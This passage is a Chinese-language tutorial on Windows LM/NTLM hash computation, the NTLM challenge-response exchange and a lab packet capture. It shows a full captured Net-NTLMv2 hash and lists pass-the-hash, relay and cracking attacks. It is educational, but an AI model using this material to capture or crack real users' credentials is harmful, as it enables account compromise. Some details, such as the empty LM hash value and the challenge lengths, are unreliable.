\u7528\u6237\u7684\u5bc6\u7801\u8bbe\u7f6e\u4e3a14\u4f4d\u4ee5\u4e0a\u5373\u53ef\u3002\\r\\n\\r\\n\u5982\u679c LM Hash\u88ab\u7981\u7528\u4e86,\u653b\u51fb\u8005\u901a\u8fc7\u5de5\u5177\u6293\u53d6\u7684 LM Hash\u901a\u5e38\u4e3a`aad3b435b51404eead3b435b51404ee`(\u8868\u793a LM Hash\u4e3a\u7a7a\u503c\u6216\u88ab\u7981\u7528)\\r\\n\\r\\n![image-20250404193402354](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404193402354.png)\\r\\n\\r\\n**\u52a0\u5bc6\u6b65\u9aa4**\\r\\n\\r\\n**1\u3001\u5c06\u660e\u6587\u53e3\u4ee4\u8f6c\u6362\u4e3a\u5176\u5927\u5199\u5f62\u5f0f \u5047\u8bbe\u8fd9\u91cc\u4ee5\u660e\u6587Admin@123\u4e3a\u4f8b\uff0c\u8f6c\u6362\u4e3a\u5927\u5199\u683c\u5f0f\u4e3a\uff1a**\\r\\n\\r\\n```\\r\\nAdmin@123----\x3e ADMIN@123\\r\\n```\\r\\n\\r\\n**2\u3001\u5c06\u5b57\u7b26\u4e32\u5927\u5199\u540e\u8f6c\u6362\u4e3a16\u8fdb\u5236\u5b57\u7b26\u4e32** \\r\\n\\r\\n```\\r\\n41 44 4d 49 4e 40 31 32 33\\r\\n```\\r\\n\\r\\n**3\u3001\u5bc6\u7801\u4e0d\u8db314\u5b57\u8282\u8981\u6c42\u75280\u8865\u5168** \\r\\n\\r\\n```\\r\\n41 44 4d 49 4e 40 31 32 33 00 00 00 00 00\\r\\n```\\r\\n\\r\\n**4\u3001\u5c06\u4e0a\u8ff0\u7f16\u7801\u5206\u62102\u7ec47\u5b57\u8282**\\r\\n\\r\\n```\\r\\n41 44 4d 49 4e 40 31\\r\\n32 33 00 00 00 00 00\\r\\n```\\r\\n\\r\\n**5\u3001\u5c06\u6bcf\u4e00\u7ec47\u5b57\u8282\u7684\u5341\u516d\u8fdb\u5236\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\uff0c\u6bcf7bit\u4e00\u7ec4\u672b\u5c3e\u52a00\uff0c\u518d\u8f6c\u6362\u6210\u5341\u516d\u8fdb\u5236\u7ec4\u6210\u5f97\u52302\u7ec48\u5b57\u8282\u7684\u7f16\u7801**\\r\\n\\r\\n\u7b2c\u4e00\u7ec4\\r\\n\\r\\n```\\r\\n01000000\\r\\n10100010\\r\\n00010010\\r\\n10101000\\r\\n10010100\\r\\n01110010\\r\\n00000000\\r\\n01100010\\r\\n```\\r\\n\\r\\n```\\r\\n40A212A894720062\\r\\n```\\r\\n\\r\\n\u7b2c\u4e8c\u7ec4\\r\\n\\r\\n```\\r\\n00110010\\r\\n00011000\\r\\n11000000\\r\\n00000000\\r\\n00000000\\r\\n00000000\\r\\n00000000\\r\\n00000000\\r\\n```\\r\\n\\r\\n```\\r\\n3218C00000000000\\r\\n```\\r\\n\\r\\n**6\u3001\u5c06\u4ee5\u4e0a\u6b65\u9aa4\u5f97\u5230\u7684\u4e24\u7ec48\u5b57\u8282\u7f16\u7801\uff0c\u5206\u522b\u4f5c\u4e3aDES\u52a0\u5bc6key\u4e3a\u9b54\u672f\u5b57\u7b26\u4e32`KGS!@#$%`\u8fdb\u884c\u52a0\u5bc6**\\r\\n\\r\\nKGS!@#$%\u768416\u8fdb\u5236\u4e3a 4B47532140232425\\r\\n\\r\\n![image-20250404194707645](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404194707645.png)\\r\\n\\r\\n![image-20250404194721282](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404194721282.png)\\r\\n\\r\\n\u62fc\u63a5\u8d77\u6765\uff0c\u5c31\u662f\u6700\u7ec8\u52a0\u5bc6\u7684\u7ed3\u679c\\r\\n\\r\\n`6F08D7B306B1DAD4B75E0C8D76954A50`\\r\\n\\r\\n### NTLM-Hash\u52a0\u5bc6\\r\\n\\r\\n\u200b\\tNTLM Hash\u662f\u57fa\u4e8eMD4\u52a0\u5bc6\u7b97 \u6cd5\u8fdb\u884c\u52a0\u5bc6\u7684\u3002\u4e2a\u4eba\u7248\u4ece Windows vista\u4ee5\u540e,\u670d\u52a1\u5668\u7248\u4ece Windows Server 2003\u4ee5\u540e, Windows\u64cd\u4f5c\u7cfb\u7edf\u7684\u8ba4\u8bc1\u65b9\u5f0f\u5747\u4e3a NTLM Hash\\r\\n\\r\\n**\u52a0\u5bc6\u6b65\u9aa4**\\r\\n\\r\\n**1\u3001\u5c06\u660e\u6587\u53e3\u4ee4\u8f6c\u6362\u6210\u5341\u516d\u8fdb\u5236\u7684\u683c\u5f0f \u5982\uff1aAdmin@123**\\r\\n\\r\\n```\\r\\nAdmin@123---\x3e41646D696E40313233\\r\\n```\\r\\n\\r\\n**2\u3001\u5c0616\u8fdb\u5236\u8f6c\u6362\u6210Unicode\u683c\u5f0f\uff0c\u5373\u5728\u6bcf\u4e2a\u5b57\u8282\u4e4b\u540e\u6dfb\u52a00x00** \\r\\n\\r\\n```\\r\\n41646D696E40313233 --\x3e 410064006D0069006E004000310032003300\\r\\n```\\r\\n\\r\\n**3\u3001\u5bf9Unicode\u5b57\u7b26\u4e32\u4f5cMD4\u52a0\u5bc6\uff0c\u751f\u621032\u4f4d\u7684\u5341\u516d\u8fdb\u5236\u6570\u5b57\u4e32** \\r\\n\\r\\n`570a9a65db8fba761c1008a51d4c95ab`\\r\\n\\r\\n![image-20250404195423728](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404195423728.png)\\r\\n\\r\\n## \u7f51\u7edc\u8ba4\u8bc1\\r\\n\\r\\n\u200b\\t**\u7f51\u7edc\u8ba4\u8bc1**\uff1aWindows\u7f51\u7edc\u8ba4\u8bc1\u662f\u6307\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fdb\u884c\u7f51\u7edc\u901a\u4fe1\u548c\u8d44\u6e90\u8bbf\u95ee\u65f6\uff0c\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\u548c\u6388\u6743\u6743\u9650\u7684\u8fc7\u7a0b\u3002\u5b83\u786e\u4fdd\u53ea\u6709\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u80fd\u591f\u8bbf\u95ee\u7f51\u7edc\u8d44\u6e90\uff0c\u5e76\u6839\u636e\u5176\u6743\u9650\u7ea7\u522b\u8fdb\u884c\u6388\u6743\u64cd\u4f5c\u3002 \\r\\n\\r\\n**\u7f51\u7edc\u8ba4\u8bc1\u6709\u54ea\u4e9b\uff1f** \\r\\n\\r\\n**1.\u7528\u6237\u540d\u548c\u5bc6\u7801\u8ba4\u8bc1**\uff1a\u8fd9\u662f\u6700\u5e38\u89c1\u7684\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u7528\u6237\u9700\u8981\u63d0\u4f9b\u6709\u6548\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u4ee5\u9a8c\u8bc1\u5176\u8eab\u4efd\u3002\u8fd9\u79cd\u8ba4\u8bc1\u65b9 \\r\\n\\r\\n\u5f0f\u9002\u7528\u4e8e\u672c\u5730\u8ba1\u7b97\u673a\u8d26\u6237\u6216\u57df\u8d26\u6237\u3002 \\r\\n\\r\\n**2.Kerberos\u8ba4\u8bc1**\uff1aKerberos\u662f\u4e00\u79cd\u7f51\u7edc\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff0c\u5728Windows\u57df\u73af\u5883\u4e2d\u5e7f\u6cdb\u4f7f\u7528\u3002\u5b83\u901a\u8fc7\u4f7f\u7528\u7968\u636e\u548c\u7968\u636e\u6388 \\r\\n\\r\\n\u4e88\u7968\u8bc1\uff08TGT\uff09\u6765\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\uff0c\u5e76\u751f\u6210\u4f1a\u8bdd\u5bc6\u94a5\u7528\u4e8e\u52a0\u5bc6\u901a\u4fe1\u3002 \\r\\n\\r\\n**3.NTLM\u8ba4\u8bc1**\uff1aNTLM\uff08NT LAN Manager\uff09\u662f\u4e00\u79cd\u65e9\u671f\u7684Windows\u7f51\u7edc\u8ba4\u8bc1\u534f\u8bae\uff0c\u5b83\u4f7f\u7528\u57fa\u4e8e\u6311\u6218-\u54cd\u5e94\u7684\u65b9\u5f0f\u8fdb \\r\\n\\r\\n\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u5c3d\u7ba1Kerberos\u5df2\u6210\u4e3a\u9996\u9009\u7684\u8ba4\u8bc1\u534f\u8bae\uff0c\u4f46NTLM\u4ecd\u7136\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f7f\u7528\uff0c\u7279\u522b\u662f\u5728\u4e0e\u65e7\u7248Windows \\r\\n\\r\\n\u7cfb\u7edf\u6216\u975eWindows\u7cfb\u7edf\u8fdb\u884c\u4e92\u64cd\u4f5c\u65f6\u3002 \\r\\n\\r\\n**4.\u5bc6\u94a5\u8eab\u4efd\u8ba4\u8bc1**\uff1aWindows\u8fd8\u652f\u6301\u4f7f\u7528\u5bc6\u94a5\u6765\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u8fd9\u79cd\u65b9\u5f0f\u6d89\u53ca\u4f7f\u7528\u9884\u5148\u5171\u4eab\u7684\u5bc6\u94a5\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd \\r\\n\\r\\n\u9a8c\u8bc1\uff0c\u901a\u5e38\u7528\u4e8e\u7279\u5b9a\u7684\u573a\u666f\u548c\u5e94\u7528\u3002 \\r\\n\\r\\n**5.\u8fdc\u7a0b\u684c\u9762\u8ba4\u8bc1\uff08Remote Desktop Authentication\uff09**\uff1a\u8fdc\u7a0b\u684c\u9762\u662f\u4e00\u79cd\u8fdc\u7a0b\u8bbf\u95eeWindows\u8ba1\u7b97\u673a\u7684\u529f\u80fd\u3002\u5728\u8fdc\u7a0b \\r\\n\\r\\n\u684c\u9762\u8fde\u63a5\u65f6\uff0c\u7528\u6237\u9700\u8981\u63d0\u4f9b\u76ee\u6807\u8ba1\u7b97\u673a\u7684\u51ed\u636e\u8fdb\u884c\u8ba4\u8bc1\uff0c\u4ee5\u9a8c\u8bc1\u8eab\u4efd\u5e76\u83b7\u5f97\u8fdc\u7a0b\u8bbf\u95ee\u6743\u9650\\r\\n\\r\\n### NTLM\u6311\u6218\u54cd\u5e94\u534f\u8bae\u8ba4\u8bc1\u673a\u5236\\r\\n\\r\\n\u200b\\tNTLM \u534f\u8bae\u662f\u4e00\u79cd\u57fa\u4e8e\u6311\u6218\uff08Challenge\uff09/\u54cd\u5e94\uff08Response\uff09\u8ba4\u8bc1\u673a\u5236\\r\\n\\r\\nNTLM \u534f\u8bae\u6311\u6218Chalenge\uff09/\u54cd\u5e94\uff08Response\uff09\u8ba4\u8bc1\u673a\u5236\u5927\u4f53\u5982\u4e0b\uff1a \\r\\n\\r\\n- 1\u3001\u534f\u5546\uff1a\u8fd9\u4e2a\u662f\u4e3a\u4e86\u89e3\u51b3\u5386\u53f2\u9057\u7559\u95ee\u9898\uff0c\u4e5f\u5c31\u662f\u4e3a\u4e86\u5411\u4e0b\u517c\u5bb9\uff0c\u53cc\u65b9\u5148\u786e\u5b9a\u4e00\u4e0b\u4f20\u8f93\u534f\u8bae\u7684\u7248\u672c\u7b49\u5404\u79cd\u4fe1\u606f\u3002 \\r\\n- 2\u3001\u8d28\u8be2\uff1a\u8fd9\u4e00\u6b65\u4fbf\u662fChallenge/Response\u8ba4\u8bc1\u673a\u5236\u7684\u5173\u952e\u4e4b\u5904 \\r\\n- 3\u3001\u9a8c\u8bc1\uff1a\u5bf9\u8d28\u8be2\u7684\u6700\u540e\u7ed3\u679c\u8fdb\u884c\u4e00\u4e2a\u9a8c\u8bc1\uff0c\u9a8c\u8bc1\u901a\u8fc7\u540e\uff0c\u5373\u5141\u8bb8\u8bbf\u95ee\u8d44\u6e90\\r\\n\\r\\n**1\u3001\u9996\u5148\uff0cclient\u4f1a\u5411server\u53d1\u8d77\u8bf7\u6c42\u8fde\u63a5\u534f\u5546\u4e00\u4e9b\u76f8\u5173\u4e1c\u897f**\\r\\n\\r\\n![image-20250405224340327](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405224340327.png)\\r\\n\\r\\n**2\u3001Server\u5c06\u4f1a\u672c\u5730\u751f\u6210\u4e00\u4e2a(16\u4f4d\u62168\u4f4d)\u968f\u673a\u5b57\u7b26\uff0c\u5373Challenge\uff0c\u5e76\u5c06Chalenge\u4f20\u7ed9client**\\r\\n\\r\\n16\u4f4d\u662f`NTLM v2`\u534f\u8bae\\r\\n\\r\\n8\u4f4d\u662f`NTLM v1`\u534f\u8bae\\r\\n\\r\\n![image-20250405224359277](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405224359277.png)\\r\\n\\r\\n**3\u3001\u5f53client\u63a5\u6536\u5230Chalenge\u65f6\uff0c\u5c06username\u7684NTLM-hash\u5bf9Chalenge\u8fdb\u884c\u52a0\u5bc6\u3001\u548c\u7528\u6237\u540d\u3001\u57df\u540d\u3001\u673a\u5668\u540d\u7b49\u76f8\u5173\u4fe1\u606f\uff0c\u751f\u6210Response\uff0c\u5e76Response\u53d1\u9001\u7ed9server\u3002**\\r\\n\\r\\n![image-20250405224525860](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405224525860.png)\\r\\n\\r\\n**4\u3001Server\u5728\u6536\u5230Response\u540e\uff0c\u5c06\u5176\u548c\u76f8\u540c\u7684\u65b9\u5f0f\u8fdb\u884c\u52a0\u5bc6\u751f\u6210\u53e6\u4e00\u4e2aResponse\uff0c\u5982\u679c\u76f8\u540c\uff0c\u5219\u9a8c\u8bc1\u6210\u529f\uff0c\u5982\u679c\u4e0d\u540c\u5c31\u5931\u8d25**\\r\\n\\r\\n![image-20250405224556545](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405224556545.png)\\r\\n\\r\\n![image-20250405224618128](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405224618128.png)\\r\\n\\r\\n### NTLM\u8ba4\u8bc1\u6293\u5305\u5206\u6790\\r\\n\\r\\n\u673a\u5668\u4e00\uff1a\\r\\n\\r\\n\u5bf9`192.168.28.3`\u53d1\u8d77NTLM\u8ba4\u8bc1\\r\\n\\r\\n```\\r\\nnet use \\\\\\\\192.168.28.3 /u:administrator qwER!@345\\r\\n```\\r\\n\\r\\n![image-20250405224658594](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405224658594.png)\\r\\n\\r\\n\u5728\u4e3b\u673a\u4e0a\u5bf9`VMnet8`\u8fdb\u884c\u6293\u5305\\r\\n\\r\\n![image-20250405224938596](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405224938596.png)\\r\\n\\r\\n\u4e00\u5171\u6293\u5230\u8fd9\u51e0\u4e2a\u5305\\r\\n\\r\\n![image-20250405225353720](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405225353720.png)\\r\\n\\r\\n1\u3001\u6211\u4eec\u5148\u770b\u524d\u56db\u4e2a\u6570\u636e\u5305\uff0c\u8fd9\u4e2a\u524d\u56db\u4e2a\u6570\u636e\u5305\u4e3b\u8981\u662f\u7528\u6765\u534f\u5546\u7684\uff0c\u6ca1\u5565\u592a\u5927\u7684\u7528\u5904\\r\\n\\r\\n![image-20250405225459592](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405225459592.png)\\r\\n\\r\\n2\u3001\u7b2c\u4e94\u4e2a\u6570\u636e\u5305\u662f\uff0c\u7528\u6237\u542f\u52a8\u8eab\u4efd\u7684\u9a8c\u8bc1\u5305\uff0c\u548c\u4e00\u4e9b\u89c4\u5219\uff0c\u4e3b\u8981\u662fflag\u91cc\u9762\u6709\u76f8\u5173\u89c4\u5219\\r\\n\\r\\n![image-20250405225611745](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405225611745.png)\\r\\n\\r\\n3\u3001\u7b2c6\u4e2a\u6570\u636e\u5305\u662f\uff0c\u6709\u4e00\u4e9b\u5305\u542b\u540c\u610f\u7684\u5217\u8868\u548c\u6700\u6700\u6700\u91cd\u8981\u7684challenge\\r\\n\\r\\n![image-20250405225648967](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405225648967.png)\\r\\n\\r\\n\u53ef\u4ee5\u770b\u5230challenge\u662f16\u4f4d\uff0c\u8fd9\u662f\u56e0\u4e3a\u8fd9\u4e2a\u91c7\u7528NTLM v2\u7684\u534f\u8bae\uff0c\u5982\u679c\u662fNTLM v1\u7684\u534f\u8bae\u5c31\u662f8\u4f4d\\r\\n\\r\\n4\u3001\u7b2c7\u4e2a\u6570\u636e\u5305\u662f\uff0c\u662f\u53d1\u9001Response\u7684\u6570\u636e\u5305\uff0c\u8fd8\u5305\u542b\u8d26\u6237\u540d\u7684\u76f8\u5173\u4fe1\u606f\\r\\n\\r\\n![image-20250405225847831](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405225847831.png)\\r\\n\\r\\n![image-20250405230013852](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405230013852.png)\\r\\n\\r\\n5\u3001\u7b2c8\u4e2a\u6570\u636e\u5305\u5c31\u662f\u8fd4\u56de\u8282\u7ed3\u679c\uff0c\u7528\u6765\u8868\u793a\u6210\u529f\u8fd8\u662f\u5931\u8d25,\u5931\u8d25\u5c31\u662fERROR\\r\\n\\r\\n\u6210\u529f\u8ba4\u8bc1\\r\\n\\r\\n![image-20250405230710208](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405230710208.png)\\r\\n\\r\\n\u5931\u8d25\u8ba4\u8bc1\\r\\n\\r\\n![image-20250405230739169](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405230739169.png)\\r\\n\\r\\n\u603b\u6d41\u7a0b\uff1a\\r\\n\\r\\n\u9996\u5148\u4e24\u53f0\u673a\u5668\u8fdb\u884c\u534f\u5546\uff08\u5148\u786e\u5b9a\u4e00\u4e0b\u4f20\u8f93\u534f\u8bae\u7684\u7248\u672c\u7b49\u5404\u79cd\u4fe1\u606f\uff09\uff0c\u7136\u540e\u670d\u52a1\u7aef\u4f1a\u53d1\u9001`challenge`\u503c\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\uff0c\u5ba2\u6237\u7aef\u62ff\u7740`challenge`\u503c\uff0c`ntlm-hash`\u7b49\u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u5f97\u5230\u7684`response`\u503c\u53d1\u9001\u7ed9\u7684\u670d\u52a1\u7aef\uff0c\u63a5\u7740\u670d\u52a1\u7aef\u540c\u6837\u4f1a\u8fdb\u884c\u52a0\u5bc6\u5f97\u5230\u4e00\u4e2a`response`\u503c\uff0c\u8fdb\u884c\u5bf9\u6bd4\uff0c\u76f8\u540c\u7684\u8bdd\u8ba4\u8bc1\u6210\u529f\uff0c\u5426\u5219\u4e0d\u6210\u529f\u3002\\r\\n\\r\\n### Challenge\u548cResponse\u5206\u6790\\r\\n\\r\\nResponse\u503c\u662f\u5ba2\u6237\u7aef\u751f\u6210\u7684\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\uff0c\u7528\u6765\u8fdb\u884c\u6821\u9a8c\u7684\\r\\n\\r\\n![image-20250405233655102](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250405233655102.png)\\r\\n\\r\\nResponse\u662f\u5982\u4f55\u751f\u6210\u7684\u5462\uff1f \\r\\n\\r\\n\u4ed6\u662f\u7531 `Response =NTProofStr+blob`\u4e24\u90e8\u5206\u62fc\u63a5\u8d77\u6765\u7684 \\r\\n\\r\\n1\u3001**NTProofStr** : NTLM-v2-Hash\u503c\uff08\u4f5ckey\uff09 \u548c challenge+blob \u8fdb\u884c HMAC-MD5\u52a0\u5bc6 \\r\\n\\r\\n**NTLM-v2-Hash**: \u5927\u5199\u7684\u7528\u6237\u540d+\u57df\u540d\u7f16\u7801\u6210unicode\u683c\u5f0f\uff0c\u7136\u540e\u548c\u5bc6\u7801\u7684NTLM-Hash\u503c\uff08\u4f5ckey\uff09\u8fdb\u884cHMAC-MD5\u52a0\u5bc6 \\r\\n\\r\\n2\u3001 **blob**\u662f\u7531\u65f6\u95f4\uff0c\u76ee\u6807\u4fe1\u606f\uff0c\u968f\u673a\u586b\u5145\u5b57\u7b26\u7b49\u751f\u6210\u3002\\r\\n\\r\\n\u6211\u4eec\u5e73\u65f6\u5728\u4f7f\u7528\u5de5\u5177\u8fdb\u884c\u653b\u51fb\u7684\u65f6\u5019\u6293\u5230\u7684\u90fd\u662f`Net-NTLM v2 Hash`\u6570\u636e\uff1a \\r\\n\\r\\n```\\r\\nusername::domain:challenge:NTProofStr:blob\\r\\n```\\r\\n\\r\\n```\\r\\nadministrator::COR:8c25a760e556403e:b4edd25f06e58b4e8bc9dbbd2d63d31e:010100000000000033ef2e3377a5db01ca06352326474a26000000000200060043004f00520001001c00570049004e005300450052005600450052002d0032003000300038000400100063006f0072002e00730069007400650003002e00770069006e007300650072007600650072002d0032003000300038002e0063006f0072002e0073006900740065000500100063006f0072002e0073006900740065000700080033ef2e3377a5db01060004000200000008003000300000000000000000000000003000005c1b8c5ff537a9ecc2a1e9230976ee550eeabb4c06d77622610f48b13bea194c0a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00320038002e003300000000000000000000000000\\r\\n```\\r\\n\\r\\n### NTLMv1\u548cNTLMv2\u7684\u533a\u522b\\r\\n\\r\\n**Challenge\u503c\u4e0d\u540c\uff1a** \\r\\n\\r\\n- NTLMv1\uff1achallenge\u503c\u662f8\u4f4d \\r\\n- NTLMv2\uff1achallenge\u503c\u662f16\u4f4d \\r\\n\\r\\n**Response\u52a0\u5bc6\u4e0d\u540c**\\r\\n\\r\\nNTLMv1\uff1a \\r\\n\\r\\n- 1\u3001\u5c06\u7528\u6237\u7684NTLM HASH\u586b\u5145\u4e3a42\u4f4d \\r\\n- 2\u3001\u5206\u4e3a3\u7ec4\uff0c\u6bcf\u7ec414\u4f4d \\r\\n- 3\u3001\u6bcf\u7ec4\u5206\u522b\u5bf9challenge\u8fdb\u884cEDS\u52a0\u5bc6 \\r\\n- 4\u3001\u62fc\u63a5\u8d77\u6765\u5c31\u662fresponse \\r\\n\\r\\n**Response\u683c\u5f0f\u4e0d\u540c**\\r\\n\\r\\n```\\r\\nV2: username::domain:challenge:NTProofStr:blob \\r\\nV1: username::hostname:LM response:NTLM response:challenge\\r\\n```\\r\\n\\r\\n\u5728\u8fd9\u91cc\u518d\u7ed9\u5927\u5bb6\u634b\u4e00\u904d\u51e0\u4e2a\u6982\u5ff5 \\r\\n\\r\\n1\u3001LM-Hash\uff1a\u9488\u5bf9\u65e9\u671fwindows\u7528\u6237\u5bc6\u7801\u8fdb\u884c\u52a0\u5bc6\u7684\u54c8\u5e0c\u503c\uff0c\u4ed6\u662f\u4e00\u6bb5hash\u503c \\r\\n\\r\\n2\u3001NTLM-Hash: \u9488\u5bf9\u76ee\u524dwindows\u7528\u6237\u5bc6\u7801\u8fdb\u884c\u52a0\u5bc6\u7684\u54c8\u5e0c\u503c\uff0c\u4ed6\u662f\u4e00\u6bb5hash\u503c \\r\\n\\r\\n3\u3001NTLM\u534f\u8bae\u8ba4\u8bc1\uff1a\u4ed6\u662f\u4e00\u79cd\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u7528\u6765\u5efa\u7acb\u4e24\u53f0\u7535\u8111\u7684\u4fe1\u4efb\uff0c\u5206\u4e3aNTLM-v1\u534f\u8bae\u548cNTLM-V2,\u662f\u534f\u8bae \\r\\n\\r\\n3\u3001 NTLM-v2-Hash :\u662f\u5728NTLM-v2\u8ba4\u8bc1\u8fc7\u7a0b\u4e2d\u7684\u4e00\u6bb5\u52a0\u5bc6\u7684 \u54c8\u5e0c\u503c \\r\\n\\r\\n4\u3001 Net-NTLM v1 Hash \u662f\u7531\u4e0d\u540c\u7684\u5b57\u6bb5\u7ec4\u6210\u7684\u503c\uff0c\u7528\u6765\u7535\u8111\u8fdb\u884c\u5bf9\u6bd4\\r\\n\\r\\n### NTLM\u534f\u8bae\u5b89\u5168\u95ee\u9898\\r\\n\\r\\n1\u3001PTH \u653b\u51fb\uff1a\u56e0\u4e3aNTLM\u8ba4\u8bc1\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u5230\u7528\u6237\u7684NTLM-hash\u503c\u8ba1\u7b97\uff0c\u5982\u679c\u8bf4\u6211\u4eec\u7684\u77e5\u9053\u5bf9\u65b9\u7535\u8111\u7684Hash\u503c\u5c31\u53ef\u4ee5\u8fdb\u884cPTH\u653b\u51fb \\r\\n\\r\\n2\u3001NET-HTLM hash relay\u653b\u51fb\uff1aNTLM\u4e2d\u95f4\u4eba\u653b\u51fb\u3001\u5982\u679c\u83b7\u5f97Net-NTLM v1 Hash \u53ef\u4ee5\u91cd\u653e\uff0c\u8fdb\u884c\u8ba4\u8bc1 \\r\\n\\r\\n3\u3001 Net-NTLM v1 v2 Hash \u7834\u89e3\uff1a v1\u6bd4\u8f83\u7b80\u5355\uff0c\u5bb9\u6613\u7834\u89e3\u4f7f\u7528DES\uff0c\u5982\u679c\u662fV2\u5c31\u8981\u4f7f\u7528\u78b0\u649e\u7684\u65b9\u5f0f\u53ef\u4ee5\u4f7f\u7528\u5f69\u8679\u8868\u6216\u8005\u66b4\u529b\u731c\u89e3\u7b49\u65b9\u5f0f\uff0c\u83b7\u53d6\u660e\u6587\u7684\u8d26\u53f7\u5bc6\u7801\\r\\n\\r\\n## \u57dfKerberos\u8ba4\u8bc1\\r\\n\\r\\n**Kerberos\u534f\u8bae\u7b80\u4ecb**\\r\\n\\r\\n\u200b\\tKerberos \u662f\u4e00\u79cd\u7f51\u7edc\u8ba4\u8bc1\u534f\u8bae\uff0c\u5176\u8bbe\u8ba1\u76ee\u6807\u662f\u901a\u8fc7\u5bc6\u94a5\u7cfb\u7edf\u4e3a\u5ba2\u6237\u673a / \u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u5f3a\u5927\u7684\u8ba4\u8bc1\u670d\u52a1\u3002\u8be5\u8ba4\u8bc1\u8fc7\u7a0b\u7684\u5b9e\u73b0\u4e0d\u4f9d\u8d56\u4e8e\u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u7684\u8ba4\u8bc1\uff0c\u65e0\u9700\u57fa\u4e8e\u4e3b\u673a\u5730\u5740\u7684\u4fe1\u4efb\uff0c\u4e0d\u8981\u6c42\u7f51\u7edc\u4e0a\u6240\u6709\u4e3b\u673a\u7684\u7269\u7406\u5b89\u5168\uff0c\u5e76\u5047\u5b9a\u7f51\u7edc\u4e0a\u4f20\u9001\u7684\u6570\u636e\u5305\u53ef\u4ee5\u88ab\u4efb\u610f\u5730\u8bfb\u53d6\u3001\u4fee\u6539\u548c\u63d2\u5165\u6570\u636e\u3002 \u5728\u4ee5\u4e0a\u60c5\u51b5\u4e0b\uff0c Kerberos \u4f5c\u4e3a\u4e00\u79cd**\u53ef\u4fe1\u4efb\u7684\u7b2c\u4e09\u65b9\u8ba4\u8bc1\u670d\u52a1**\uff0c\u662f\u901a\u8fc7\u4f20\u7edf\u7684\u5bc6\u7801\u6280\u672f\uff08\u5982\uff1a\u5171\u4eab\u5bc6\u94a5\uff09\u6267\u884c\u8ba4\u8bc1\u670d\u52a1\u7684\u3002\\r\\n\\r\\n### kerberos\u534f\u8bae\u89d2\u8272\u7ec4\u6210\\r\\n\\r\\n\u200b\\t\u5728\u53e4\u5e0c\u814a\u795e\u8bdd\u6545\u4e8b\u4e2d\uff0ckerberos\u662f\u4e00\u53ea\u5177\u6709**\u4e09\u9897\u5934\u9885\u7684\u5730\u72f1\u6076\u72ac**\uff0c\u4ed6\u5b88\u62a4\u5728\u5730\u72f1\u4e4b\u5916\uff0c\u80fd\u591f\u8bc6\u522b\u6240\u6709\u7ecf\u6b64\u8def\u8fc7\u7684\u4ea1\u7075\uff0c\u9632\u6b62\u6d3b\u7740\u7684\u5165\u4fb5\u8005\u95ef\u5165\u5730\u72f1\\r\\n\\r\\n**kerberos\u534f\u8bae\u4e2d\u4e5f\u5b58\u5728\u4e09\u4e2a\u89d2\u8272\uff0c\u5206\u522b\u662f**\\r\\n\\r\\n\u200b\\t**1\u3001\u5ba2\u6237\u7aef\uff08client\uff09**\uff1a\u53d1\u9001\u8bf7\u6c42\u7684\u4e00\u65b9 \\r\\n\\r\\n\u200b\\t**2\u3001\u670d\u52a1\u7aef\uff08Server\uff09**\uff1a\u63a5\u6536\u8bf7\u6c42\u7684\u4e00\u65b9 \\r\\n\\r\\n\u200b\\t**3\u3001\u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3\uff08Key Distribution Center\uff0cKDC\uff09**\uff0c\u800c\u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3\u4e00\u822c\u53c8\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u5206\u522b\u662f\uff1a \\r\\n\\r\\n\u200b\\t\\t**AS\uff08Authentication 